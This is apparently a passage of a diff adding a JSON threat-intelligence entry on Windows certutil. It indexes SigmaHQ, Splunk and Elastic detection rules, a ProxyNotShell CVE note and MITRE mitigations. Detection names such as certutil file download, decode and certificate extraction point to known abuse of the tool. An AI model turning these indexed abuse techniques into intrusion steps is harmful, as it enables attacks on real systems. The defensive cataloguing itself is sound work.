+        "id": "1277f594-a7d1-4f28-a2d3-73af5cbeab43",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_shell_write_susp_directory.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059"
+        ]
+      },
+      {
+        "title": "Legitimate Application Dropped Archive",
+        "id": "654fcc6d-840d-4844-9b07-2c3300e54a26",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_susp_legitimate_app_dropping_archive.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
+        "title": "Legitimate Application Dropped Executable",
+        "id": "f0540f7e-2db3-4432-b9e0-3965486744bc",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_susp_legitimate_app_dropping_exe.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
+        "title": "Legitimate Application Writing Files In Uncommon Location",
+        "id": "1cf465a1-2609-4c15-9b66-c32dbe4bfd67",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_susp_legitimate_app_dropping_in_uncommon_location.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1105",
+          "T1218"
+        ]
+      },
+      {
+        "title": "Legitimate Application Dropped Script",
+        "id": "7d604714-e071-49ff-8726-edeb95a70679",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_susp_legitimate_app_dropping_script.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious Child Process Of DiskShadow.EXE",
+        "id": "9f546b25-5f12-4c8d-8532-5893dcb1e4b8",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_diskshadow_child_process_susp.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process of Notepad++ Updater - GUP.Exe",
+        "id": "bb0e87ce-c89f-4857-84fa-095e4483e9cb",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_gup_susp_child_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1195.002",
+          "T1557"
+        ]
+      },
+      {
+        "title": "HTML Help HH.EXE Suspicious Child Process",
+        "id": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_hh_html_help_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047",
+          "T1059.001",
+          "T1059.003",
+          "T1059.005",
+          "T1059.007",
+          "T1218",
+          "T1218.001",
+          "T1218.010",
+          "T1218.011",
+          "T1566",
+          "T1566.001"
+        ]
+      },
+      {
+        "title": "Suspicious Shells Spawn by Java Utility Keytool",
+        "id": "90fb5e62-ca1f-4e22-b42e-cc521874c938",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_java_keytool_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious Child Process Of Manage Engine ServiceDesk",
+        "id": "cea2b7ea-792b-405f-95a1-b903ea06458f",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_java_manageengine_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1102"
+        ]
+      },
+      {
+        "title": "Suspicious Processes Spawned by Java.EXE",
+        "id": "0d34ed8b-1c12-4ff2-828c-16fc860b766d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_java_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious Microsoft OneNote Child Process",
+        "id": "c27515df-97a9-4162-8a60-dc0eeb51b775",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_onenote_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1566",
+          "T1566.001"
+        ]
+      },
+      {
+        "title": "Suspicious Microsoft Office Child Process",
+        "id": "438025f9-5856-4663-83f7-52f878a70a50",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047",
+          "T1204.002",
+          "T1218.010"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious Execution Of PDQDeployRunner",
+        "id": "12b8e9f5-96b2-41e1-9a42-8c6779a5c184",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_pdqdeploy_runner_susp_children.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potential Defense Evasion Via Rename Of Highly Relevant Binaries",
+        "id": "0ba1da6d-b6ce-4366-828c-18826c9de23e",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_renamed_binary_highly_relevant.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.003"
+        ]
+      },
+      {
+        "title": "Suspicious Modification Of Scheduled Tasks",
+        "id": "1c0e41cd-21bb-4433-9acc-4a2cd6367b9b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_change.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1053.005"
+        ]
+      },
+      {
+        "title": "Suspicious Spool Service Child Process",
+        "id": "dcdbc940-0bff-46b2-95f3-2d73f848e33b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_spoolsv_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1068",
+          "T1203"
+        ]
+      },
+      {
+        "title": "LOL-Binary Copied From System Directory",
+        "id": "f5d19838-41b5-476c-98d8-ba8af4929ee2",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir_lolbin.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.003"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious Execution From Parent Process In Public Folder",
+        "id": "69bd9b97-2be2-41b6-9816-fb08757a4d1a",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_execution_from_public_folder_as_parent.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line",
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059",
+          "T1564"
+        ]
+      },
+      {
+        "title": "Suspicious FileFix Execution Pattern",
+        "id": "b5b29e4e-31fa-4fdf-b058-296e7a1aa0c2",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_filefix_execution_pattern.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1204.004"
+        ]
+      },
+      {
+        "title": "LOLBIN Execution From Abnormal Drive",
+        "id": "d4ca7c59-e9e4-42d8-bf57-91a776efcb87",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_lolbin_exec_from_non_c_drive.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious Process Parents",
+        "id": "cbec226f-63d9-4eca-9f52-dfb6652f24df",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_parents.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036"
+        ]
+      },
+      {
+        "title": "Windows Shell/Scripting Processes Spawning Suspicious Programs",
+        "id": "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_susp_program.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1059.005",
+          "T1218"
+        ]
+      },
+      {
+        "title": "System File Execution Location Anomaly",
+        "id": "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_system_exe_anomaly.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036"
+        ]
+      },
+      {
+        "title": "Suspicious Process By Web Server Process",
+        "id": "8202070f-edeb-4d31-a010-a26c72ac5600",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_webshell_susp_process_spawned_from_webserver.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1190",
+          "T1505.003"
+        ]
+      },
+      {
+        "title": "Suspicious WindowsTerminal Child Processes",
+        "id": "8de89e52-f6e1-4b5b-afd1-41ecfa300d48",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_windows_terminal_susp_children.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious Processes Spawned by WinRM",
+        "id": "5cc2cda8-f261-4d88-a2de-e9e193c86716",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_winrm_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1190"
+        ]
+      },
+      {
+        "title": "Suspicious Process Created Via Wmic.EXE",
+        "id": "3c89a1e8-0fba-449e-8f1b-8409d6267ec8",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wmic_susp_process_creation.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047"
+        ]
+      },
+      {
+        "title": "Suspicious WmiPrvSE Child Process",
+        "id": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wmiprvse_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1047",
+          "T1204.002",
+          "T1218.010"
+        ]
+      }
+    ],
+    "other_rules": [
+      "https://raw.githubusercontent.com/splunk/security_content/develop/dev_ssa/endpoint/ssa___windows_certutil_decode_file.yml",
+      "https://raw.githubusercontent.com/splunk/security_content/develop/dev/endpoint/certutil_download_with_urlcache_and_split_arguments.yml",
+      "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/certutil_exe_certificate_extraction.yml",
+      "https://raw.githubusercontent.com/elastic/detection-rules/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml"
+    ]
+  },
+  "related_CVE": [
+    {
+      "id": "CVE-2022-41040",
+      "description": "Microsoft Exchange Server server-side request forgery, chained with CVE-2022-41082 (remote code execution) as ProxyNotShell. In the August 2022 intrusion where GTSC found these zero-days, the attackers used certutil to download files and test connections. Source: CERT-EU, citing GTSC.",
+      "references": [
+        {
+          "source_name": "CERT-EU SA2022-068 December 2022",
+          "url": "https://www.cert.europa.eu/static/SecurityAdvisories/2022/CERT-EU-SA2022-068.pdf"
+        }
+      ]
+    }
+  ],
+  "mitigations": [
+    {
+      "id": "M1047",
+      "name": "Audit",
+      "technique": "T1560.001",
+      "description": "System scans can be performed to identify unauthorized archival utilities."
+    },
+    {
+      "id": "M1031",
+      "name": "Network Intrusion Prevention",
+      "technique": "T1105",
+      "description": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
+    },
+    {
+      "id": "M1037",
+      "name": "Filter Network Traffic",
+      "technique": "T1105",
+      "description": "Use network filtering to block outbound traffic from compromised systems to unapproved external destinations. Restricting access to known, trusted IP addresses and protocols can prevent attackers from downloading malicious tools or payloads onto compromised servers after gaining initial access."
+    },
+    {
+      "id": "M1054",
+      "name": "Software Configuration",
+      "technique": "T1553.004",
+      "description": "HTTP Public Key Pinning (HPKP) is one method to mitigate potential Adversary-in-the-Middle situations where and adversary uses a mis-issued or fraudulent certificate to intercept encrypted communications by enforcing use of an expected certificate."
+    },
+    {
+      "id": "M1028",
+      "name": "Operating System Configuration",
+      "technique": "T1553.004",
+      "description": "Windows Group Policy can be used to manage root certificates and the Flags value of HKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\ProtectedRoots can be set to 1 to prevent non-administrator users from making further root installations into their own HKCU certificate store."
+    }
+  ],
+  "additional_mitigations": [],
+  "references": [
+    "https://attack.mitre.org/software/S0160",
+    "https://app.tidalcyber.com/software/2fe21578-ee31-4ee8-b6ab-b5f76f97d043-certutil",
+    "https://lolbas-project.github.io/lolbas/Binaries/Certutil/",
+    "https://strontic.github.io/xcyclopedia/library/certutil.exe-09A8A29BAA3A451713FD3D07943B4A43.html"
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
+}
